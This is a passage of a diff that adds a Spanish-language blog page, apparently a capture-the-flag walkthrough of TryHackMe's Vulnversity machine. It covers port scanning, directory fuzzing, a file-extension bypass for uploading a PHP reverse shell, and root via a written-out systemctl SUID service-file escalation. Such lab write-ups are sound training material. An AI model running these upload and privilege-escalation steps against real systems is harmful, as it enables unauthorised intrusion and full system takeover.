controlar el sistema y sus servicios, por lo que procederemos a buscarlo en GTFOBins. Como podemos ver, podemos abusar de este binario fácilmente, además de que nos permite ejecutar cualquier código malicioso que queramos Para conseguir la última flag haremos lo siguiente: TF=$(mktemp).service echo &#39;[Service] Type=oneshot ExecStart=/bin/sh -c &quot;chmod +s /bin/bash&quot; [Install] WantedBy=multi-user.target&#39; &gt; $TF /bin/systemctl link $TF /bin/systemctl enable --now $TF Si nos percatamos, lo único que modificamos de la información que nos provee GTFOBins, fue el código a ejecutar, en este caso, estamos asignando un permiso SUID a la /bin/bash, para posteriormente, a través del parámetro -p, ejecutar el binario /bin/bash manteniendo permisos y privilegios del usuario al que le pertenece el binario, en este caso al usuario root. Otro aspecto que se modificó, fue utilizar el binario /bin/systemctl desde su ruta absoluta, mas no de su ruta relativa. Una vez hemos abusado del binario /bin/systemctl, haremos lo siguiente: /bin/bash -p Una vez siendo root, podemos pasar a buscar su respectiva flag, esto lo podemos hacer así: find / -name root.txt","headline":"Vulnversity - TryHackMe","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:8000/es/Vulnversity-TryHackMe/"},"url":"http://0.0.0.0:8000/es/Vulnversity-TryHackMe/"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+  <!-- Google Tag Manager -->
+  <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+  new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+  j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+  'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+  })(window,document,'script','dataLayer','GTM-PPKV9V8T');</script>
+  <!-- End Google Tag Manager -->
+
+</head>
+
+
+
+<body>
+
+  <!-- Google Tag Manager (noscript) -->
+  <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PPKV9V8T"
+  height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+  <!-- End Google Tag Manager (noscript) -->
+
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1 class="glitch-header">filthyHacker@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/es"><h2 class="header-link">Publicaciones</h2></a>
+<a href="/es/search"><h2 class="header-link">Buscar</h2></a>
+<a href="/es/archive"><h2 class="header-link">Archivo</h2></a>
+<a href="/en"><h2 class="header-link">English</h2></a>
+
+    </div>
+  </div>
+</header>
+
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>Vulnversity - TryHackMe</h2>
+  <time datetime="2021-10-25T00:00:00-04:00" class="by-line">
+    
+      25/10/2021
+    
+  </time>
+  <p>El día de hoy vamos a resolver la máquina <em>Vulnversity</em> de <em>TryHackMe</em>. Esta es una máquina fácil tanto en la intrusión como en la escalada de privilegios, por lo que no supondrá ninguna complicación a la hora de realizarla.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-25-Vulnversity-TryHackMe/1.png" alt="" /></p>
+
+<h3 id="fase-de-reconocimiento"><a href="#header-3"></a>Fase De Reconocimiento</h3>
+
+<p>Primeramente, vamos a utilizar la herramienta <em>Nmap</em> para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Es importante aclarar que, así como menciona la plataforma de <em>TryHackMe</em>, existen diversos <a href="https://www.stationx.net/nmap-cheat-sheet/">cheatsheets</a> que podemos encontrar en internet, cuyo principal objetivo es darnos a conocer cuales son todas las posibilidades que nos ofrece la herramienta.</p>
+
+<p>No obstante, recordemos que varias herramientas por defecto tienen incluidas un <code class="language-plaintext highlighter-rouge">manual</code> o vienen con un comando <code class="language-plaintext highlighter-rouge">--help</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>man nmap
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap --help
+</code></pre></div></div>
+
+<p>Entre las preguntas que nos realiza la plataforma en esta primera fase, se encuentra:</p>
+
+<ul>
+  <li>¿Cuántos puertos abiertos existen?</li>
+  <li>¿Qué sistema operativo tiene la máquina ante la que nos estamos enfrentando?</li>
+  <li>¿En qué puerto está corriendo el servidor web?</li>
+  <li>¿Qué versión de squid proxy está corriendo en la máquina?</li>
+</ul>
+
+<p>Todas estas preguntas son fáciles de responder si realizamos un buen escaneo con <em>Nmap</em>.</p>
+
+<p>Para determinar que puertos están abiertos podemos realizar lo siguiente:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-T5</span> <span class="nt">-v</span> <span class="nt">-n</span> &lt;dirección IP&gt;
+</code></pre></div></div>
+
+<p>Y en caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> &lt;dirección IP&gt;
+</code></pre></div></div>
+
+<p>A continuación se explican los parámetros utilizados en el escaneo de puertos con <em>Nmap</em>:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Parámetro</th>
+      <th style="text-align: left">Explicación</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">-p-</td>
+      <td style="text-align: left">Escanea todo el rango de puertos (65535 en total)</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">--open</td>
+      <td style="text-align: left">Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos)</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-T5</td>
+      <td style="text-align: left">La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido”, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos <code class="language-plaintext highlighter-rouge">White Hat</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-v</td>
+      <td style="text-align: left"><em>Verbose</em>, reporta lo encontrado por consola</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-n</td>
+      <td style="text-align: left">No aplicar <em>resolución DNS</em></td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-sS</td>
+      <td style="text-align: left">Escaneo <em>TCP SYN</em></td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-min-rate</td>
+      <td style="text-align: left">Emitir paquetes no más lentos que &lt;valor&gt; por segundo</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-vvv</td>
+      <td style="text-align: left">Triple <em>verbose</em>, para obtener mayor información por consola</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-Pn</td>
+      <td style="text-align: left">No aplicar <em>host discovery</em></td>
+    </tr>
+  </tbody>
+</table>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p</span> 21,22,139,445,3128,3333 &lt;dirección IP&gt;
+</code></pre></div></div>
+
+<p>A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con <em>Nmap</em>:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Parámetro</th>
+      <th style="text-align: left">Explicación</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">-sC</td>
+      <td style="text-align: left">Scripts básicos de enumeración</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-sV</td>
+      <td style="text-align: left">Versión y servicios que corren bajo los puertos encontrados</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-p</td>
+      <td style="text-align: left">Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior)</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Con estos dos escaneos bastará para responder a las preguntas planteadas con anterioridad, sin embargo, nos quedan dos preguntas más, las cuales son:</p>
+
+<ul>
+  <li>¿Cuántos puertos se escanearán si utilizamos el parámetro -p-400?</li>
+  <li>Utilizando el parámetro -n, ¿qué no se está resolviendo?</li>
+</ul>
+
+<p>Para responder a estas dos preguntas bastará con haber leído el <code class="language-plaintext highlighter-rouge">manual</code> de <em>Nmap</em>, haber utilizado su parámetro <code class="language-plaintext highlighter-rouge">--help</code>, o bien, haber prestado atención a los parámetros utilizados durante el escaneo. En este caso, si colocamos un número después de <code class="language-plaintext highlighter-rouge">-p-</code>, se escaneará tantos puertos hayamos indicado; y en el caso del parámetro <code class="language-plaintext highlighter-rouge">-n</code>, no se aplicará <em>resolución DNS</em>.</p>
+
+<p>Una vez hemos determinado que puertos están abiertos, así como identificado la versión y servicios que corren en el activo, otro paso importante dentro de la fase de reconocimiento, es el <code class="language-plaintext highlighter-rouge">fuzzing</code>; cabe aclarar que este solo se realiza cuando la máquina víctima está corriendo un servidor web.</p>
+
+<p><em>TryHackMe</em> nos recomienda utilizar <code class="language-plaintext highlighter-rouge">GoBuster</code>, sin embargo, personalmente prefiero el uso de <code class="language-plaintext highlighter-rouge">Wfuzz</code>; en caso de no contar con esta herramienta instalada, bastará con realizar lo siguiente:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt install wfuzz
+</code></pre></div></div>
+
+<p>Para pasar a la fase de explotación, lo que nos solicita la plataforma es encontrar una ruta potencial de la página web, que nos permita una subida de archivos, para lo cual debemos de <em>fuzzear</em> la página web, para ello realizaremos lo siguiente:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-c</span> <span class="nt">-L</span> <span class="nt">-t</span> 400 <span class="nt">--hc</span> 404 <span class="nt">--hh</span> 33014 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://dirección IP:3333/FUZZ
+</code></pre></div></div>
+
+<p>A continuación se explican los parámetros utilizados en el <em>fuzzeo</em> del servidor web:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Parámetro</th>
+      <th style="text-align: left">Explicación</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">-c</td>
+      <td style="text-align: left">Output colorizado</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-L</td>
+      <td style="text-align: left">Sigue las redirecciones HTTP, de modo que conseguimos el código de estado final verdadero</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-t</td>
+      <td style="text-align: left">Específicamos el número de hilos con el queremos trabajar</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">--hc</td>
+      <td style="text-align: left">Oculta las respuestas con el código de estado que indiquemos, en este caso los errores (código de estado 404)</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">--hh</td>
+      <td style="text-align: left">Oculta las respuestas con el número de caractéres que indiquemos; esto no es necesario, sin embargo, es útil para descartar respuestas con contenido que vemos que no nos interesan</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-w</td>
+      <td style="text-align: left">Especificamos el diccionario con el que queremos trabajar</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-25-Vulnversity-TryHackMe/2.png" alt="" /></p>
+
+<p>En caso de no utilizar el parámetro <code class="language-plaintext highlighter-rouge">-hh</code>, vemos que obtenemos una mayor cantidad de respuestas, sin embargo, no son relevantes, por este motivo es que se las escondió.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-25-Vulnversity-TryHackMe/3.png" alt="" /></p>
+
+<p>Como podemos observar, existen cinco direcciones a las cuales podemos acceder, sin embargo, solamente una de ellas llama nuestra atención, la dirección <code class="language-plaintext highlighter-rouge">internal</code>, ya que en <em>images</em>, <em>css</em>, <em>js</em> y <em>fonts</em> parece ser donde está alojado el contenido de la página web. Y en efecto, al entrar en la dirección <code class="language-plaintext highlighter-rouge">internal</code>, podemos observar que tenemos un panel que nos permite realizar una subida de archivos, con la cual nos entablaremos una <code class="language-plaintext highlighter-rouge">reverse shell</code>.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-25-Vulnversity-TryHackMe/4.png" alt="" /></p>
+
+<h3 id="fase-de-explotación"><a href="#header-3"></a>Fase De Explotación</h3>
+
+<p>Al encontrarnos una ruta potencial que nos permite una subida de archivos, lo primero que vamos a intentar es entablarnos una <code class="language-plaintext highlighter-rouge">reverse shell</code>; podemos descargar una <a href="https://pentestmonkey.net/tools/web-shells/php-reverse-shell">aquí</a>. Una vez la hayamos descargado, tenemos que modificar el valor de la <code class="language-plaintext highlighter-rouge">ip</code> (colocamos la nuestra), y si queremos, podemos también modificar el valor del <em>puerto</em>, aunque esto es completamente opcional.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-25-Vulnversity-TryHackMe/5.png" alt="" /></p>
+
+<p>Sin embargo, cuando intentamos subir nuestra <code class="language-plaintext highlighter-rouge">reverse shell</code>, nos aparecerá un mensaje indicándonos que la extensión de nuestro archivo no es permitida.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-25-Vulnversity-TryHackMe/6.png" alt="" /></p>
+
+<p>Por lo que tendremos que buscar una extensión que no nos de problema alguno. Si realizáramos este proceso de forma manual, sería algo bastante tedioso, por lo que vamos a utilizar <code class="language-plaintext highlighter-rouge">Burp Suite</code> para poder realizar un ataque de tipo <code class="language-plaintext highlighter-rouge">Sniper</code>.</p>
+
+<p>Para ello, vamos a empezar por volver a subir nuestra <code class="language-plaintext highlighter-rouge">reverse shell</code>, pero ahora tramitando todas las peticiones a través de <code class="language-plaintext highlighter-rouge">Burp Suite</code>.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-25-Vulnversity-TryHackMe/7.png" alt="" /></p>
+
+<p>Posterior a ello presionaremos <code class="language-plaintext highlighter-rouge">Ctrl + I</code> para enviar esta petición al <code class="language-plaintext highlighter-rouge">Intruder</code>.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-25-Vulnversity-TryHackMe/8.png" alt="" /></p>
+
+<p>Ahora, en el apartado <em>Positions</em>, en el tipo de ataque elegiremos la opción de <code class="language-plaintext highlighter-rouge">Sniper</code>, después seleccionaremos la opción <code class="language-plaintext highlighter-rouge">Clear §</code>, para posteriormente con nuestro cursor <code class="language-plaintext highlighter-rouge">resaltar</code> la zona en la que se encuentra la extensión del archivo que subimos, para finalmente presionar la opción <code class="language-plaintext highlighter-rouge">Add §</code>; esto se vería algo así:</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-25-Vulnversity-TryHackMe/9.png" alt="" /></p>
+
+<p>Posteriormente, procederemos a crear un pequeño diccionario con las extensiones más comunes de <em>PHP</em>:</p>
+
+<ul>
+  <li>.php</li>
+  <li>.phtml</li>
+  <li>.php3</li>
+  <li>.php4</li>
+  <li>.php5</li>
+  <li>.php7</li>
+  <li>.phps</li>
+  <li>.php-s</li>
+  <li>.pht</li>
+  <li>.phar</li>
+</ul>
+
+<p>Una vez, hemos creado nuestro diccionario, en el apartado <em>Payloads</em>, en la opción <em>Sample List</em> cargaremos el diccionario que hemos creado; en este mismo apartado, en el final, encontraremos una opción que codifica ciertos caracteres especiales, esta opción la desactivaremos.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-25-Vulnversity-TryHackMe/10.png" alt="" /></p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-25-Vulnversity-TryHackMe/11.png" alt="" /></p>
+
+<p>Finalmente, presionaremos el botón de iniciar ataque, e inmediatamente aparecerá una nueva ventana mostrándonos los resultados obtenidos, o bien, aquello que todavía está probando. Podríamos revisar una a una las respuestas del lado del servidor, pero si nos percatamos, aunque todas las respuestas tengan el mismo código de estado <code class="language-plaintext highlighter-rouge">200</code>, la <em>longitud</em> de estas no es la misma para todas las extensiones, la única extensión cuya <em>longitud</em> varía es <code class="language-plaintext highlighter-rouge">.phtml</code>; si quisiéramos estar completamente seguros, podríamos revisar el <em>render</em> de la respuesta, el cual nos devuelve un <em>success</em>.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-25-Vulnversity-TryHackMe/12.png" alt="" /></p>
+
+<p>Con esta información, ya sabemos que tipo de archivo es válido para subir en la ruta <code class="language-plaintext highlighter-rouge">internal</code>, por lo que procederemos a cambiar la extensión de nuestro archivo y subirlo una última vez.</p>
+
+<p>Una vez el archivo está subido, podemos ponernos en escucha por el puerto que hayamos establecido en nuestra <code class="language-plaintext highlighter-rouge">reverse shell</code> a través de <code class="language-plaintext highlighter-rouge">Netcat</code>. A partir de aquí podemos hacer dos cosas:</p>
+
+<p>Podemos navegar a la dirección en la que está subido nuestro archivo (tal como lo indica la plataforma de <em>TryHackMe</em>), es decir, entrar a:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://&lt;dirección IP&gt;:3333/internal/uploads/nombreDeLaReverseShell.phtml
+</code></pre></div></div>
+<p>O, por otra parte, y sin dejar la consola, utilizar el comando <code class="language-plaintext highlighter-rouge">curl</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://&lt;dirección IP&gt;:3333/internal/uploads/nombreDeLaReverseShell.phtml
+</code></pre></div></div>
+
+<p>Ambas opciones, nos conseguirán una <em>consola</em> dentro de la máquina víctima.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-25-Vulnversity-TryHackMe/13.png" alt="" /></p>
+
+<p>Es importante aclarar que la <em>consola</em> que acabamos de conseguir, no es nada interactiva, esto quiere decir que si quisiéramos limpiar la <em>consola</em> utilizando <code class="language-plaintext highlighter-rouge">Ctrl + L</code>, no pasará nada, así mismo si quisiéramos desplazarnos utilizando las <code class="language-plaintext highlighter-rouge">flechas</code> del teclado, no nos será posible hacerlo, para ello deberemos de realizar el respectivo tratamiento de la <code class="language-plaintext highlighter-rouge">TTY</code>, para lo cual haremos lo siguiente:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>script /dev/null <span class="nt">-c</span> bash
+
+Ctrl + Z
+
+<span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg
+</span>reset
+xterm
+
+<span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
+<span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>bash
+
+<span class="nb">stty </span>rows &lt;valor&gt; columns &lt;valor&gt;
+</code></pre></div></div>
+
+<p>Los valores que colocaremos en <code class="language-plaintext highlighter-rouge">&lt;valor&gt;</code> en el último comando, dependerán del tamaño de nuestra pantalla, por lo cual en una nueva terminal de nuestra máquina escribiremos lo siguiente:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stty -a
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-25-Vulnversity-TryHackMe/14.png" alt="" /></p>
+
+<p>Continuando con las preguntas de la plataforma, se nos pide averiguar por el usuario que maneja el servidor web, así como su respectiva flag. Para realizar esto podríamos dirigirnos al directorio <code class="language-plaintext highlighter-rouge">/home</code>, y listar los directorios que existen.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-25-Vulnversity-TryHackMe/15.png" alt="" /></p>
+
+<p>Aunque también podríamos filtrar del archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code>, a través de expresiones regulares, todos aquello usuario que tengan una <em>shell</em>, sea esta una:</p>
+
+<ul>
+  <li>bash</li>
+  <li>csh</li>
+  <li>ksh</li>
+  <li>sh</li>
+  <li>tcsh</li>
+  <li>zsh</li>
+</ul>
+
+<p>Esto sería bastante fácil, ya que todas, o casi todas las <em>shells</em> terminan en <code class="language-plaintext highlighter-rouge">sh</code>, de modo que con ambas formas podemos determinar que usuarios existen a nivel de sistema.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /etc/passwd | <span class="nb">grep</span> <span class="s2">"sh$"</span>
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-25-Vulnversity-TryHackMe/16.png" alt="" /></p>
+
+<p>Una vez hemos listado los usuarios del sistema, podemos pasar a buscar en que ruta se encuentra la flag del usuario con bajos privilegios, para ello podemos hacer lo siguiente:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-name</span> user.txt 2&gt; /dev/null
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-25-Vulnversity-TryHackMe/17.png" alt="" /></p>
+
+<h3 id="escalada-de-privilegios"><a href="#header-3"></a>Escalada De Privilegios</h3>
+
+<p>Para realizar esta última fase, la misma plataforma de <em>TryHackMe</em> nos sugiere aprovecharnos de algún binario con permisos mal asignados, concretamente permisos <code class="language-plaintext highlighter-rouge">SUID</code>.</p>
+
+<p>Para listar todos aquellos binarios con permisos <code class="language-plaintext highlighter-rouge">SUID</code> asignados, tenemos varias opciones, no obstante, estas son las que yo utilizo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-type</span> f <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-la</span> <span class="o">{}</span> 2&gt;/dev/null <span class="se">\;</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-uid</span> 0 <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-type</span> f 2&gt;/dev/null
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-25-Vulnversity-TryHackMe/18.png" alt="" /></p>
+
+<p>La mejor forma para abusar de cualquier binario, es recurrir a <a href="https://gtfobins.github.io/">GTFOBins</a>, esta página nos enseña como explotar binarios con <em>capabilities</em> mal asignadas, binarios que se pueden ejecutar como root, y en este caso, binarios con permisos <code class="language-plaintext highlighter-rouge">SUID</code> mal asignados.</p>
+
+<p>El binario más extraño que nos encontramos es <code class="language-plaintext highlighter-rouge">/bin/systemctl</code>, ya que este comando lo que nos permite es controlar el sistema y sus servicios, por lo que procederemos a buscarlo en <a href="https://gtfobins.github.io/">GTFOBins</a>.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-25-Vulnversity-TryHackMe/19.png" alt="" /></p>
+
+<p>Como podemos ver, podemos abusar de este binario fácilmente, además de que nos permite ejecutar cualquier código malicioso que queramos</p>
+
+<p>Para conseguir la última flag haremos lo siguiente:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">TF</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span><span class="si">)</span>.service
+<span class="nb">echo</span> <span class="s1">'[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "chmod +s /bin/bash"
+[Install]
+WantedBy=multi-user.target'</span> <span class="o">&gt;</span> <span class="nv">$TF</span>
+/bin/systemctl <span class="nb">link</span> <span class="nv">$TF</span>
+/bin/systemctl <span class="nb">enable</span> <span class="nt">--now</span> <span class="nv">$TF</span>
+</code></pre></div></div>
+
+<p>Si nos percatamos, lo único que modificamos de la información que nos provee <code class="language-plaintext highlighter-rouge">GTFOBins</code>, fue el código a ejecutar, en este caso, estamos asignando un permiso <code class="language-plaintext highlighter-rouge">SUID</code> a la <code class="language-plaintext highlighter-rouge">/bin/bash</code>, para posteriormente, a través del parámetro <code class="language-plaintext highlighter-rouge">-p</code>, ejecutar el binario <code class="language-plaintext highlighter-rouge">/bin/bash</code> manteniendo permisos y privilegios del usuario al que le pertenece el binario, en este caso al usuario root. Otro aspecto que se modificó, fue utilizar el binario <code class="language-plaintext highlighter-rouge">/bin/systemctl</code> desde su ruta absoluta, mas no de su ruta relativa.</p>
+
+<p>Una vez hemos abusado del binario <code class="language-plaintext highlighter-rouge">/bin/systemctl</code>, haremos lo siguiente:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/bash -p
+</code></pre></div></div>
+
+<p>Una vez siendo root, podemos pasar a buscar su respectiva flag, esto lo podemos hacer así:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-name</span> root.txt
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-25-Vulnversity-TryHackMe/20.png" alt="" /></p>
+
+</article>
+
+      </section>
+    </div>
+  </div>
+
+  
+
+  <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>m4teo</b>
+    </span>
+    
+    <span>© 2024</span>
+  </a>
+</footer>
+
+
+  
+    <script type="text/javascript">
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'G-524F5BE8G5', 'auto');
+  ga('send', 'pageview');
+</script>
+  
+
+</body>
+</html>
